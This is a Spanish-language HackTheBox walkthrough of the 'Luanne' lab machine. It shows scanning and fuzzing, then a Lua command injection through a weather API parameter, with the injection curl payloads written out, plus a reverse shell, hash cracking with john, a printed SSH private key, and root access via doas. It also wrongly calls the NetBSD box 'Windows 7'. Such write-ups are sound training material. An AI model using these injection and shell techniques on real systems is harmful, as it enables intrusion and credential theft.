---
layout      : post
title       : "Maquina Luanne - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Luanne/banner.jpg
category    : [ hackthebox ]
tags        : [ NETBSD, Api json explotation, Lua Command Injection, Abussing httpd Parameter, Cracking Hashes]
---

El dia de hoy vamos a resolver `Luanne` de `hackthebox` una maquina `linux` de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en `JSON` donde con la ayuda de `burpsuite` aprovecharemos el uso de parametros para causar una inyección en `lua` con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de `httpd` que corre en `NETBSD` obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario `root` y habremos comprometido el sistema.
 
Esta maquina es divertida asi que a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Luanne
❯ ls
 Luanne
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.218
PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms

--- 10.10.10.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `254` y contando el salto al ser `255`, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un `NetBSD`. Mas adelante cuando comprometamos la maquina validaremos si es correcto.

* [https://subinsb.com/default-device-ttl-values/](https://subinsb.com/default-device-ttl-values/)

![](/assets/images/HTB/htb-writeup-Luanne/lua1.PNG)


### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
Initiating SYN Stealth Scan at 16:31
Scanning 10.10.10.218 [65535 ports]
Discovered open port 80/tcp on 10.10.10.218
Discovered open port 22/tcp on 10.10.10.218
Discovered open port 9001/tcp on 10.10.10.218
Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
Nmap scan report for 10.10.10.218
Host is up, received user-set (0.28s latency).
Scanned at 2023-06-29 16:31:40 GMT for 27s
Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
Nmap scan report for 10.10.10.218
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
```
Podemos ver que nmap nos reporta dos rutas validas `robots` y `weather`.

Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina `Windows 7`:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |   OpenSSH 8.0 |
| 80   | HTTP     |  nginx 1.19.0|
| 9001   |  TOR-ORPORT    |  Medusa httpd 1.12 |


## EXPLOTACION [#](#explotación) {#explotación}


Comenzamos usando `whatweb`, para determinar las tecnologias que esta usando el servicio web.

```bash
❯ whatweb http://10.10.10.218
http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
```

La herramienta nos reporta `unathorized`, en otras palabras nos solicita credenciales.

```bash
❯ whatweb http://10.10.10.218:9001
http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
```

Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.


![](/assets/images/HTB/htb-writeup-Luanne/lua2.PNG)


Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto `robots.txt` y podemos ver que dentro la ruta `weather` esta desabilitada.

![](/assets/images/HTB/htb-writeup-Luanne/lua3.PNG)


Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con `wfuzz` vamos a tratar de fuzear por archivos dentro de esa ruta.


```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.218/weather/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000007114:   200        1 L      12 W       90 Ch       "forecast"                                                                                                            
000015529:   404        7 L      11 W       153 Ch      "hitb"
```

Despues de aplicar fuzzing, vemos que existe una ruta `forecast` que si la visualizamos tenemos acceso a una api `json`.


![](/assets/images/HTB/htb-writeup-Luanne/lua4.PNG)

En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.

![](/assets/images/HTB/htb-writeup-Luanne/lua5.PNG)


Como vemos que se estan usando parametros, vamos a pasar la petición por `burpsuite` para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de `foxyproxy`.

![](/assets/images/HTB/htb-writeup-Luanne/lua6.PNG)


Recibimos la petición en `burpsuite` y la mandamos al repeater.

![](/assets/images/HTB/htb-writeup-Luanne/lua7.PNG)


Ahora trataremos de realizar una inyección en la petición incorporando una `'`.

![](/assets/images/HTB/htb-writeup-Luanne/lua8.PNG)

Ocasionamos un`luaerror`, asi que podemos tratar de ejecutar un comando con `lua`, usando `os.execute()`. y comentando la query.


![](/assets/images/HTB/htb-writeup-Luanne/lua9.PNG)

En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo `urlencode` y esta vez si vemos la ejecución correctamente.


![](/assets/images/HTB/htb-writeup-Luanne/lua10.PNG)


Lo siguiente que haremos sera entablarnos una `revershell` a nuestra maquina usando `mkfifo` para que si tenemos una versión distinta de `ncat` evitar inconenientes, para ello podemos usar la pagina web de confianza de `pentestmonkey`.

* [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.

![](/assets/images/HTB/htb-writeup-Luanne/lua11.PNG)


Y recibimos la conexión en nuestra maquina como el usuario `httpd`.


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:65479.
sh: can't access tty; job control turned off
$ whoami
_httpd
$ hostname
luanne.htb
$ uname -a  
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
```

Y vemos que si se corresponde a un `NetBSD`.


Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de `httpd`, por el puerto `3001` que apunta a la ruta `weather`similar a la que usamos para ganar acceso al sistema.


```bash
curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'"
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-"
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{"code": 500,"error": "unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-"
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{"code": 500,"error": "unknown city: list_httpd
```

Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en `NETBSD`.

Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.

* [https://man.netbsd.org/NetBSD-9.3/i386/httpd.8](https://man.netbsd.org/NetBSD-9.3/i386/httpd.8)

Entre los parametros que se utiliza en la petición, podemos ver que `-u`, permite la transformación de localizadores uniformes de recursos de la forma `/~user/` en el directorio `~user/public_html`.


![](/assets/images/HTB/htb-writeup-Luanne/lua12.PNG)


Ahora podemos aprovecharnos de esto, para lista los recursos del directorio `r.michaels`, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre `.htpasswd` que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con `john`.

```bash
ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

Despues de realizar el crackeo `john`, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar `webapi_user:iamthebest`, podemos usarlas en la petición.


```bash
curl -s -X GET "http://127.0.0.1:3001/~r.michaels/" -u 'webapi_user:iamthebest'
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
	border-top: 1px solid black;
	border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

Esta vez podemos listar el contenido del usuario `r.michaels` y dentro vemos su `id_rsa`.

Ahora tal y como nos dice el articulo de `NETBSD`, podemos hacer uso del paramtro `-G` para ver el output.

```bash
curl -s -X GET "http://127.0.0.1:3001/~r.michaels/id_rsa" -u 'webapi_user:iamthebest' -G id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8
3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE
pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I
GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF
8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb
Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa
POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3
GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW
nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm
xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl
7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP
DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX
er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n
NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su
o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8
Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA
wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6
LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv
+ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc
f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO
D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk
N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo
IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg
nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq
189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg
QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

Ya con la `id_rsa` al estar abierto el puerto `22`, podemos conectarnos como `r.michaels`, sin proporcionar contraseña.


```bash
❯ nvim id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa r.michaels@10.10.10.218
The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ whoami
r.michaels
```

Visualizamos los archivos, del directorio y podemos leer la primera flag `user.txt`.

```bash
backups     devel       public_html user.txt
luanne$ cat user.txt                                                                                                                                                                  
ea5f0ce6a917b0be1eabc7f9218febc0
```


## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si listamos el directorio del usuario, obsevamos un directorio `backup`, que dentro contiene un archivo tar encrpytado.

```bash
luanne$ ls
backups     devel       public_html user.txt
luanne$ cd backups/                                                                                                                                                                   
luanne$ ls 
devel_backup-2020-09-16.tar.gz.enc
```

Ahora en `NETBSD`, existe una herramienta para decsencriptar estos archivos que corresponde ah `netpgp`. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.


```bash
luanne$ netpgp
NetPGP portable 3.99.17/[20101103]
All bug reports, praise and chocolate, please, to:
Alistair Crooks <agc@netbsd.org> c0596823
Usage: netpgp COMMAND OPTIONS:
netpgp  --help OR
        --encrypt [--output=file] [options] files... OR
        --decrypt [--output=file] [options] files... OR

        --sign [--armor] [--detach] [--hash=alg] [--output=file]
                [options] files... OR
        --verify [options] files... OR
        --cat [--output=file] [options] files... OR
        --clearsign [--output=file] [options] files... OR
        --list-packets [options] OR
        --version
where options are:
        [--cipher=<ciphername>] AND/OR
        [--coredumps] AND/OR
        [--homedir=<homedir>] AND/OR
        [--keyring=<keyring>] AND/OR
        [--numtries=<attempts>] AND/OR
        [--userid=<userid>] AND/OR
        [--maxmemalloc=<number of bytes>] AND/OR
        [--verbose]
```

Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con `python`, usaremos `nc`.


![](/assets/images/HTB/htb-writeup-Luanne/lua13.PNG)


Lo descomprimimos y dentro vemos otro archivo `.htpasswd`.

```bash
❯ ls
 devel_backup-2020-09-16.tar.gz   id_rsa
❯ file devel_backup-2020-09-16.tar.gz
devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
❯ tar -xf devel_backup-2020-09-16.tar.gz
❯ ls
 devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
❯ cd devel-2020-09-16
❯ ls
 webapi   www
❯ tree -fas
.
├── [         22]  ./webapi
│   └── [       7072]  ./webapi/weather.lua
└── [         38]  ./www
    ├── [         47]  ./www/.htpasswd
    └── [        378]  ./www/index.html

2 directories, 3 files
```

Al leer el archivo, vemos una contraeña `hasheada`, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro `hash`.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear       (webapi_user)
1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos una nueva contraseña `littlebear`, que curiosamente corresponde a la del usuario `root`, pero para migrar no podemos hacer uso de `su root`, ya que en `NETBSD` lo hacemos usando el comando `doas`.

```bash
luanne$ su root 
su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication error
luanne$ doas sh
Password:
# whoami
root
```

Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag `root.txt` y asi habriamos concluido.

```bash
# cd /root
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
```

